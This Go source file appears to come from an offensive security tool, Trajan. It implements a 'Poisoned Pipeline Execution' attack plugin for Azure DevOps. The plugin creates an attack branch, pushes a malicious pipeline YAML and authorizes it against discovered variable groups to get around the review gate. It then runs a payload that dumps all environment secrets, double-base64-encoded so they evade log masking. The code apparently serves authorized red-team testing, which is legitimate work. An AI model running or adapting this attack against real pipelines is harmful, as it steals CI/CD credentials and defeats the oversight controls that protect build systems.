package pipelineinjection

import (
	"context"
	"fmt"
	"strings"
	"time"

	"github.com/praetorian-inc/trajan/internal/registry"
	"github.com/praetorian-inc/trajan/pkg/attacks"
	"github.com/praetorian-inc/trajan/pkg/attacks/audit"
	"github.com/praetorian-inc/trajan/pkg/attacks/base"
	"github.com/praetorian-inc/trajan/pkg/azuredevops"
	"github.com/praetorian-inc/trajan/pkg/azuredevops/attacks/common"
	"github.com/praetorian-inc/trajan/pkg/detections"
)

func init() {
	registry.RegisterAttackPlugin("azuredevops", "ado-pipeline-injection", func() attacks.AttackPlugin {
		return New()
	})
}

// Plugin implements pipeline injection attack (Poisoned Pipeline Execution)
type Plugin struct {
	base.BaseAttackPlugin
}

// New creates a new pipeline injection attack plugin
func New() *Plugin {
	return &Plugin{
		BaseAttackPlugin: base.NewBaseAttackPlugin(
			"ado-pipeline-injection",
			"Poisoned Pipeline Execution - inject malicious pipeline YAML to exfiltrate secrets",
			"azuredevops",
			attacks.CategoryCICD,
		),
	}
}

// CanAttack checks if pipeline injection attack is applicable
func (p *Plugin) CanAttack(findings []detections.Finding) bool {
	return common.FindingHasType(findings, detections.VulnScriptInjection) ||
		common.FindingHasType(findings, detections.VulnDynamicTemplateInjection)
}

// Execute performs the pipeline injection attack on Azure DevOps
func (p *Plugin) Execute(ctx context.Context, opts attacks.AttackOptions) (*attacks.AttackResult, error) {
	audit.LogAttackStart(opts.SessionID, p.Name(), opts.Target, opts.DryRun)

	result := &attacks.AttackResult{
		Plugin:    p.Name(),
		SessionID: opts.SessionID,
		Timestamp: time.Now(),
	}

	// Get ADO client
	client, err := common.GetADOClient(opts.Platform)
	if err != nil {
		result.Success = false
		result.Message = err.Error()
		return result, err
	}

	// Parse project/repo from target value
	project, repo, err := common.ParseProjectRepo(opts.Target.Value)
	if err != nil {
		result.Success = false
		result.Message = err.Error()
		return result, err
	}

	// Auto-discover variable groups in the project
	var discoveredGroups []azuredevops.VariableGroup
	groups, err := client.ListVariableGroups(ctx, project)
	if err != nil {
		// Non-fatal: log and continue without variable groups
		fmt.Printf("Warning: failed to list variable groups: %v\n", err)
	} else {
		discoveredGroups = groups
	}

	// Get repository to find default branch
	repository, err := client.GetRepository(ctx, project, repo)
	if err != nil {
		result.Success = false
		result.Message = fmt.Sprintf("failed to get repository: %v", err)
		return result, err
	}

	defaultBranch := repository.DefaultBranch
	if defaultBranch == "" {
		defaultBranch = "refs/heads/main"
	}
	// Strip refs/heads/ prefix
	defaultBranch = strings.TrimPrefix(defaultBranch, "refs/heads/")

	// Get commit ID for default branch
	branches, err := client.ListGitBranches(ctx, project, repo)
	if err != nil {
		result.Success = false
		result.Message = fmt.Sprintf("failed to list branches: %v", err)
		return result, err
	}

	var commitID string
	refName := "refs/heads/" + defaultBranch
	for _, branch := range branches {
		if branch.Name == refName {
			commitID = branch.ObjectID
			break
		}
	}

	if commitID == "" {
		result.Success = false
		result.Message = fmt.Sprintf("failed to find default branch: %s", defaultBranch)
		return result, fmt.Errorf("branch not found: %s", defaultBranch)
	}

	branchName := fmt.Sprintf("trajan-inject-%s", opts.SessionID)
	pipelinePath := "azure-pipelines-trajan-injection.yml"

	// Generate malicious pipeline YAML
	pipelineYAML := p.generatePipelineYAML(opts.ExtraOpts, discoveredGroups)

	if opts.DryRun {
		result.Success = true
		result.Message = fmt.Sprintf("[DRY RUN] Would create pipeline injection attack on %s/%s", project, repo)
		result.Artifacts = []attacks.Artifact{
			{
				Type:        attacks.ArtifactBranch,
				Identifier:  branchName,
				Description: "Attack branch",
			},
			{
				Type:        attacks.ArtifactWorkflow,
				Identifier:  fmt.Sprintf("pipeline:%d", 0), // Placeholder for dry run
				Description: "Pipeline definition",
			},
		}
		result.CleanupActions = []attacks.CleanupAction{
			{
				Type:        attacks.ArtifactWorkflow,
				Identifier:  fmt.Sprintf("pipeline:%d", 0),
				Action:      "delete",
				Description: "Delete pipeline definition",
			},
			{
				Type:        attacks.ArtifactBranch,
				Identifier:  branchName,
				Action:      "delete",
				Description: "Delete attack branch",
			},
		}
		result.Data = map[string]interface{}{
			"branch":        branchName,
			"pipeline_path": pipelinePath,
			"project":       project,
			"repo":          repo,
		}
		return result, nil
	}

	// Create attack branch
	err = client.CreateBranch(ctx, project, repo, branchName, commitID)
	if err != nil {
		result.Success = false
		result.Message = fmt.Sprintf("failed to create branch: %v", err)
		return result, err
	}

	result.Artifacts = append(result.Artifacts, attacks.Artifact{
		Type:        attacks.ArtifactBranch,
		Identifier:  branchName,
		Description: "Attack branch created",
	})

	branches, err = client.ListGitBranches(ctx, project, repo)
	if err != nil {
		result.Success = false
		result.Message = fmt.Sprintf("failed to list branches: %v", err)
		return result, err
	}

	var newBranchCommitID string
	newRefName := "refs/heads/" + branchName
	for _, branch := range branches {
		if branch.Name == newRefName {
			newBranchCommitID = branch.ObjectID
			break
		}
	}

	if newBranchCommitID == "" {
		result.Success = false
		result.Message = fmt.Sprintf("failed to find new branch: %s", branchName)
		return result, fmt.Errorf("branch not found: %s", branchName)
	}

	// Push malicious pipeline YAML to branch
	commitMsg := "Add pipeline injection test"
	err = client.PushFile(ctx, project, repo, branchName, pipelinePath, pipelineYAML, commitMsg, newBranchCommitID)
	if err != nil {
		result.Success = false
		result.Message = fmt.Sprintf("failed to push pipeline file: %v", err)
		return result, err
	}

	// Create pipeline definition pointing to the malicious YAML
	pipelineReq := azuredevops.CreatePipelineRequest{
		Name:   fmt.Sprintf("trajan-injection-%s", opts.SessionID),
		Folder: "\\",
	}
	pipelineReq.Configuration.Type = "yaml"
	pipelineReq.Configuration.Path = "/" + pipelinePath
	pipelineReq.Configuration.Repository.ID = repository.ID
	pipelineReq.Configuration.Repository.Type = "azureReposGit"

	pipeline, err := client.CreatePipeline(ctx, project, pipelineReq)
	if err != nil {
		result.Success = false
		result.Message = fmt.Sprintf("failed to create pipeline: %v", err)
		return result, err
	}

	result.Artifacts = append(result.Artifacts, attacks.Artifact{
		Type:        attacks.ArtifactWorkflow,
		Identifier:  fmt.Sprintf("pipeline:%d", pipeline.ID),
		Description: "Pipeline definition created",
	})

	// Authorize pipeline to access variable groups (bypass "Waiting for review")
	if len(discoveredGroups) > 0 {
		if err := common.AuthorizeVariableGroups(ctx, client, project, pipeline.ID, discoveredGroups); err != nil {
			// Non-fatal: log and continue
			fmt.Printf("Warning: failed to authorize variable groups: %v\n", err)
		}
	}

	// Run the pipeline on the attack branch
	runReq := azuredevops.RunPipelineRequest{}
	runReq.Resources.Repositories = map[string]struct {
		RefName string `json:"refName"`
	}{
		"self": {RefName: "refs/heads/" + branchName},
	}

	run, err := client.RunPipeline(ctx, project, pipeline.ID, runReq)
	if err != nil {
		result.Success = false
		result.Message = fmt.Sprintf("failed to run pipeline: %v", err)
		return result, err
	}

	result.Success = true
	result.Message = fmt.Sprintf("Pipeline injection successful. Pipeline ID: %d, Run ID: %d. Check build logs for exfiltrated secrets (double-base64 encoded).",
		pipeline.ID, run.ID)
	result.Data = map[string]interface{}{
		"branch":        branchName,
		"pipeline_path": pipelinePath,
		"pipeline_id":   pipeline.ID,
		"run_id":        run.ID,
		"project":       project,
		"repo":          repo,
	}

	result.CleanupActions = []attacks.CleanupAction{
		{
			Type:        attacks.ArtifactWorkflow,
			Identifier:  fmt.Sprintf("pipeline:%d", pipeline.ID),
			Action:      "delete",
			Description: "Delete pipeline definition",
		},
		{
			Type:        attacks.ArtifactBranch,
			Identifier:  branchName,
			Action:      "delete",
			Description: "Delete attack branch",
		},
	}

	audit.LogAttackEnd(opts.SessionID, p.Name(), opts.Target, result)
	return result, nil
}

// generatePipelineYAML generates the malicious pipeline YAML
func (p *Plugin) generatePipelineYAML(extraOpts map[string]string, groups []azuredevops.VariableGroup) string {
	// Base pipeline with no trigger (pipeline will be run explicitly via RunPipeline API)
	yaml := `trigger: none

pool:
  vmImage: 'ubuntu-latest'

`

	// Determine which variable groups to use
	var groupsToUse []azuredevops.VariableGroup

	// extraOpts takes precedence over discovered groups
	if extraOpts != nil {
		if groupsStr, ok := extraOpts["groups"]; ok && groupsStr != "" {
			// Manual groups specified via extraOpts
			yaml += "variables:\n"
			for _, group := range strings.Split(groupsStr, ",") {
				group = strings.TrimSpace(group)
				if group != "" {
					yaml += fmt.Sprintf("  - group: %s\n", group)
				}
			}
			yaml += "\n"
			// Don't generate env block for manual groups (we don't know which vars are secret)
		} else {
			// No manual groups, use discovered groups
			groupsToUse = groups
		}
	} else {
		// No extraOpts, use discovered groups
		groupsToUse = groups
	}

	// Add discovered variable groups and their env mappings
	if len(groupsToUse) > 0 {
		yaml += common.GenerateVariableGroupsYAML(groupsToUse)
	}

	// Payload with double-base64 encoding to bypass secret masking
	payload := `steps:
  - script: |
      echo "=== Pipeline Injection - Trajan ==="
      env | sort | while read line; do
        echo "$line" | base64 | base64
      done
    displayName: 'Execute Payload'
`

	// Add env block for secret variables (appended after displayName as step-level property)
	if len(groupsToUse) > 0 {
		envBlock := common.GenerateSecretEnvYAML(groupsToUse)
		if envBlock != "" {
			payload += envBlock
		}
	}

	return yaml + payload
}

// Cleanup removes artifacts created by the attack
func (p *Plugin) Cleanup(ctx context.Context, session *attacks.Session) error {
	client, err := common.GetADOClient(session.Platform)
	if err != nil {
		return err
	}

	// We need project/repo from target
	project, repo, err := common.ParseProjectRepo(session.Target.Value)
	if err != nil {
		return err
	}

	for _, result := range session.Results {
		if result.Plugin != p.Name() {
			continue
		}

		for _, action := range result.CleanupActions {
			switch action.Type {
			case attacks.ArtifactWorkflow:
				// Parse pipeline ID from identifier "pipeline:<ID>"
				var pipelineID int
				if _, err := fmt.Sscanf(action.Identifier, "pipeline:%d", &pipelineID); err != nil {
					fmt.Printf("Failed to parse pipeline ID from %s: %v\n", action.Identifier, err)
					continue
				}

				if err := client.DeletePipeline(ctx, project, pipelineID); err != nil {
					if strings.Contains(err.Error(), "404") || strings.Contains(err.Error(), "Not Found") {
						fmt.Printf("Pipeline %d already deleted or doesn't exist\n", pipelineID)
						continue
					}
					return fmt.Errorf("deleting pipeline %d: %w", pipelineID, err)
				}

			case attacks.ArtifactBranch:
				// Get branch commit ID for deletion
				branches, err := client.ListGitBranches(ctx, project, repo)
				if err != nil {
					if strings.Contains(err.Error(), "404") || strings.Contains(err.Error(), "Not Found") {
						fmt.Printf("Branch %s already deleted or doesn't exist\n", action.Identifier)
						continue
					}
					return fmt.Errorf("listing branches for deletion: %w", err)
				}

				var commitID string
				refName := "refs/heads/" + action.Identifier
				for _, branch := range branches {
					if branch.Name == refName {
						commitID = branch.ObjectID
						break
					}
				}

				if commitID == "" {
					fmt.Printf("Branch %s already deleted or doesn't exist\n", action.Identifier)
					continue
				}

				if err := client.DeleteBranch(ctx, project, repo, action.Identifier, commitID); err != nil {
					if strings.Contains(err.Error(), "404") || strings.Contains(err.Error(), "Not Found") {
						fmt.Printf("Branch %s already deleted or doesn't exist\n", action.Identifier)
						continue
					}
					return fmt.Errorf("deleting branch %s: %w", action.Identifier, err)
				}
			}
		}
	}

	return nil
}
